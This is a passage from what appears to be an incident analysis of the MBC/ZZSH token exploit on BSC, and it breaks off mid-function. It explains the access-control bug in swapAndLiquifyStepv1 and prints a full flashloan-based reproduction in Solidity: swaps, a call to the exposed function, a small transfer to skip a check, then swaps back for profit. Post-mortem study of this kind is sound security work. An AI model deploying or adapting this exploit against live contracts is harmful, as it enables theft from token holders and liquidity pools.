</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tokenBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span>addLiquidityUsdt<span class="p">(</span>tokenBalance<span class="p">,</span><span class="w"> </span>ethBalance<span class="p">);</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">}</span>
</span></code></pre></div>
<p>This function first retrieves the contract's USDT and MBC token balances, then calls the <code>addLiquidityUsdt</code> function with these balances as parameters.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">addLiquidityUsdt</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tokenAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">usdtAmount</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span>uniswapV2Router<span class="p">.</span>addLiquidity<span class="p">(</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span>_baseToken<span class="p">),</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">        </span>usdtAmount<span class="p">,</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span>tokenAmount<span class="p">,</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">        </span>_tokenOwner<span class="p">,</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">        </span><span class="k">block.timestamp</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="p">}</span>
</span></code></pre></div>
<p>The <code>addLiquidityUsdt</code> function directly calls the Router's <code>addLiquidity</code> function, using all of the contract's balances as parameters to add liquidity for the <code>tokenOwner</code>. It's evident that <code>swapAndLiquifyStepV1</code> is merely a wrapper for the <code>addLiquidity</code> function, allowing the contract's balance to be used for liquidity addition. This functionality should have been a <code>private</code> function, but it's mistakenly declared as <code>public</code>, enabling attackers to use the contract's balance to add liquidity. (Moreover, based on the attack transaction, it seems that no actual swapping occurred, and liquidity was added directly.) </p>
<p>The ZZSH contract has identical code to the MBC contract.</p>
<h2 id="exploit">Exploit</h2>
<h3 id="reproduce">Reproduce</h3>
<p>To reproduce the exploit based on the AttackTx, follow the steps below.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">23474460</span><span class="p">;</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span>cheats<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">startBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Initial attacker USDT&quot;</span><span class="p">,</span><span class="w"> </span>startBalance<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">dodoUSDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo<span class="p">);</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="c1">// Start flashloan</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span>DPPOracle<span class="p">(</span>dodo<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodoUSDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo&quot;</span><span class="p">));</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span><span class="c1">// Attack ends</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">endBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total profit USDT&quot;</span><span class="p">,</span><span class="w"> </span>endBalance<span class="w"> </span><span class="o">-</span><span class="w"> </span>startBalance<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="p">}</span>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="kt">function</span><span class="w"> </span><span class="nv">dodoCall</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="cm">/*sender*/</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="cm">/*baseAmount*/</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">quoteAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span><span class="cm">/*data*/</span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo<span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">        </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total borrowed USDT&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">        </span><span class="c1">// Approve before swap</span>
</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="w">        </span>usdt<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>pancakeRouter<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint</span><span class="p">).</span>max<span class="p">);</span>
</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="w">        </span>mbc<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>pancakeRouter<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint</span><span class="p">).</span>max<span class="p">);</span>
</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="w">        </span>zzsh<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>pancakeRouter<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint</span><span class="p">).</span>max<span class="p">);</span>
</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>
</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="w">        </span>attack<span class="p">();</span>
</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="w">        </span><span class="c1">// Repay flashloan</span>
</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="p">}</span>
</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>
</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="kt">function</span><span class="w"> </span><span class="nv">attack</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="w">    </span>USDT2VulToken<span class="p">(</span>mbc_usdt<span class="p">);</span>
</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>
</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="w">    </span>mbc<span class="p">.</span>swapAndLiquifyStepv1<span class="p">();</span>
</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="w">    </span><span class="c1">// mbc_usdt.sync(); // unnecessary</span>
</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>
</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="w">    </span>usdt<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>mbc_usdt<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">1001</span><span class="p">);</span><span class="w">  </span><span class="c1">// According to _isAddLiquidityV1 function when calling _transfer, to avoid executing swapAndLiquify function</span>
</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="w">    </span>VulToken2USDT<span class="p">(</span>mbc_usdt<span class="p">);</span>
</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a>
</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="w">    </span><span class="c1">// zzsh</span>
</span><span id="__span-2-42"><a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a><span class="w">    </span>USDT2VulToken<span class="p">(</span>zzsh_usdt<span class="p">);</span>
</span><span id="__span-2-43"><a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="w">    </span>zzsh<span class="p">.</span>swapAndLiquifyStepv1<span class="p">();</span>
</span><span id="__span-2-44"><a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a><span class="w">    </span>usdt<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>zzsh_usdt<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">1001</span><span class="p">);</span>
</span><span id="__span-2-45"><a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a><span class="w">    </span>VulToken2USDT<span class="p">(</span>zzsh_usdt<span class="p">);</span>
</span><span id="__span-2-46"><a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a><span class="p">}</span>
</span><span id="__span-2-47"><a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a>
</span><span id="__span-2-48"><a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a><span class="kt">function</span><span class="w"> </span><span class="nv">DPPFlashLoanCall</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">baseAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">quoteAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-49"><a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a><span class="w">    </span>dodoCall<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>baseAmount<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">,</span><span class="w"> </span>data<span class="p">);</span>
</span><span id="__span-2-50"><a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a><span class="p">}</span>
</span><span id="__span-2-51"><a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a>
</span><span id="__span-2-52"><a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a><span class="kt">function</span><span class="w"> </span><span class="nv">USDT2VulToken</span><span class="p">(</span>PancakePair<span class="w"> </span>target<span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-53"><a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a><span class="w">    </span><span class="c1">// Swap 150k USDT to MBC/ZZSH</span>
</span><span id="__span-2-54"><a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a><span class="w">    </span>usdt<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>target<span class="p">),</span><span class="w"> </span><span class="err">150</span>_000<span class="w"> </span>ether<span class="p">);</span>
</span><span id="__span-2-55"><a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve0</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve1</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>target<span class="p">.</span>getReserves<span class="p">();</span>
</span><span id="__span-2-56"><a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amountOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
</span><span id="__span-2-57"><a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>target<span class="p">.</span>token0<span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-58"><a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a><span class="w">        </span>amountOut<span class="w">  </span><span class="o">=</span><span class="w"> </span>pancakeRouter<span class="p">.</span>getAmountOut<span class="p">(</span><span class="err">150</span>_000<span class="w"> </span>ether<span class="p">,</span><span class="w"> </span>reserve1<span class="p">,</span><span class="w"> </span>reserve0<span class="p">);</span>
</span><span id="__span-2-59"><a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a><span class="w">        </span>target<span class="p">.</span>swap<span class="p">(</span>amountOut<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span id="__span-2-60"><a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a><span class="w">        </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total exchanged vulnerable token&quot;</span><span class="p">,</span><span class="w"> </span>ERC20<span class="p">(</span>target<span class="p">.</span>token0<span class="p">()).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>mbc<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-2-61"><a id="__codelineno-2-61" name="__codelineno-2-61" href="#__codelineno-2-61"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-62"><a id="__codelineno-2-62" name="__codelineno-2-62" href="#__codelineno-2-62"></a><span class="w">        </span>amountOut<span class="w">  </span><span class="o">=</span><span class="w"> </span>pancakeRouter<span class="p">.</span>getAmountOut<span class="p">(</span><span class="err">150</span>_000<span class="w"> </span>ether<span class="p">,</span><span class="w"> </span>reserve0<span class="p">,</span><span class="w"> </span>reserve1<span class="p">);</span>
</span><span id="__span-2-63"><a id="__codelineno-2-63" name="__codelineno-2-63" href="#__codelineno-2-63"></a><span class="w">        </span>target<span class="p">.</span>swap<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>amountOut<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span id="__span-2-64"><a id="__codelineno-2-64" name="__codelineno-2-64" href="#__codelineno-2-64"></a><span class="w">        </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total exchanged vulnerable token&quot;</span><span class="p">,</span><span class="w"> </span>ERC20<span class="p">(</span>target<span class="p">.</span>token1<span class="p">()).</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>mbc<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-2-65"><a id="__codelineno-2-65" name="__codelineno-2-65" href="#__codelineno-2-65"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-2-66"><a id="__codelineno-2-66" name="__codelineno-2-66" href="#__codelineno-2-66"></a><span class="p">}</span>
</span><span id="__span-2-67"><a id="__codelineno-2-67" name="__codelineno-2-67" href="#__codelineno-2-67"></a>
</span><span id="__span-2-68"><a id="__codelineno-2-68" name="__codelineno-2-68" href="#__codelineno-2-68"></a><span class="kt">function</span><span class="w"> </span><span class="nv">VulToken2USDT</span><span class="p">(</span>PancakePair<span class="w"> </span>target<span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-69"><a id="__codelineno-2-69" name="__codelineno-2-69" href="#__codelineno-2-69"></a><span class="w">    </span><span class="c1">// Swap MBC/ZZSH to USDT</span>
</span><span id="__span-2-70"><a id="__codelineno-2-70" name="__codelineno-2-70" href="#__codelineno-2-70"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve0</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve1</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>target<span class="p">.</span>getReserves<span class="p">();</span>
</span><span id="__span-2-71"><a id="__codelineno-2-71" name="__codelineno-2-71" href="#__codelineno-2-71"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">usdtAmountout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
</span><span id="__span-2-72"><a id="__codelineno-2-72" name="__codelineno-2-72" href="#__codelineno-2-72"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>target<span class="p">.</span>token0<span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-73"><a id="__codelineno-2-73" name="__codelineno-2-73" href="#__codelineno-2-73"></a><span class="w">        </span>ERC20<span class="w"> </span>token<span class="w"> </span><span class="o">=</span><span class="w"> </span>ERC20<span class="p">(</span>target<span class="p">.</span>token0<span class="p">());</span>
</span><span id="__span-2-74"><a id="__codelineno-2-74" name="__codelineno-2-74" href="#__codelineno-2-74"></a><span class="w">        </span>token<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>target<span class="p">),</span><span class="w"> </span>token<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span>
</span><span id="__span-2-75"><a id="__codelineno-2-75" name="__codelineno-2-75" href="#__codelineno-2-75"></a><span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amountIn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>token<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>target<span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>reserve0<span class="p">;</span>
</span><span id="__span-2-76"><a id="__codelineno-2-76" name="__codelineno-2-76" href="#__codelineno-2-76"></a><span class="w">        </span>usdtAmountout<span class="w">  </span><span class="o">=</span><span class="w"> </span>pancakeRouter<span class="p">.</span>getAmountOut<span class="p">(</span>amountIn<span class="p">,</span><span class="w"> </span>reserve0<span class="p">,</span><span class="w"> </span>reserve1<span class="p">);</span>
</span><span id="__span-2-77"><a id="__codelineno-2-77" name="__codelineno-2-77" href="#__codelineno-2-77"></a><span class="w">        </span>target<span class="p">.</span>swap<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>usdtAmountout<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span id="__span-2-78"><a id="__codelineno-2-78" name="__codelineno-2-78" href="#__codelineno-2-78"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-2-79"><a id="__codelineno-2-79" name="__codelineno-2-79" href="#__codelineno-2-79"></a><span class="w">        </span>ERC20<span class="w"> </span>token<span class="w"> </span><span class="o">=</span><span class="w"> </span>ERC20<span class="p">(</span>target<span class="p">.</span>token1<span class="p">());</span>
</span><span id="__span-2-80"><a id="__codelineno-2-80" name="__codelineno-2-80" href="#__codelineno-2-80"></a><span class="w">        </span>token<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>target<span class="p">),</span><span class="w"> </span>token<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span>
</span><span id="__span-2-81"><a id="__codelineno-2-81" name="__codelineno-2-81" href="#__codelineno-2-81"></a><span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amountIn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>token<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>target<span class="p">))</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>reserve1<span class="p">;</span>
</span><span id="__span-2-82"><a id="__codelineno-2-82" name="__codelineno-2-82" href="#__codelineno-2-82"></a><span class="w">        </span>usdtAmountout<span class="w">  </span><span class="o">=</span><span class="w"> </span>pancakeRouter<span class="p">.</span>getAmountOut<span class="p">(</span>amountIn<span class="p">,</span><span class="w"> </span>reserve1<span class="p">,</span><span class="w"> </span>reserve0<span class="p">);</span>
</span><span id="__span-2-83"><a id="__codelineno-2-83" name="__codelineno-2-83" href="#__codelineno-2-83"></a><span class="w">        </span>target<span class="p">.</span>swap<span class="p">(</span>usdtAmountout<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span id="__span-2-84"><a id="__codelineno-2-84" name="__codelineno-2-84" href="#__codelineno-2-84"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-2-85"><a id="__codelineno-2-85" name="__codelineno-2-85" href="#__codelineno-2-85"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total exchanged USDT token&quot;</span><span class="p">,</span><span class="w"> </span>usdtAmountout<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-2-86"><a id="__codelineno-2-86" name="__codelineno-2-86" href="#__codelineno-2-86"></a><span class="p">}</span>
</span></code></pre></div>
<p>First, initiate a flashloan from the DoDo pool with a large amount of USDT. In the callback function <code>dodoCall</code>, approve token transfers, execute the <code>attack</code> function, and repay the flashloan. The <code>attack</code> function involves swapping USDT to target tokens, adding liquidity to the pool by <code>swapAndLiquifyStepv1</code>, and then swapping back to USDT. This process results in a profit of approximately 5.9k USDT.</p>
<p>One peculiar aspect when analyzing the attack transaction is the need to transfer 1001/10^18 USDT to the pool when swapping back to USDT. This relates to the token transfer implementation.</p>
<p>When swapping tokens, the attacker transfers target tokens to the pool in exchange for USDT. This involves the following transfer function:</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transfer</span><span class="p">(</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">from</span><span class="p">,</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">to</span><span class="p">,</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span>
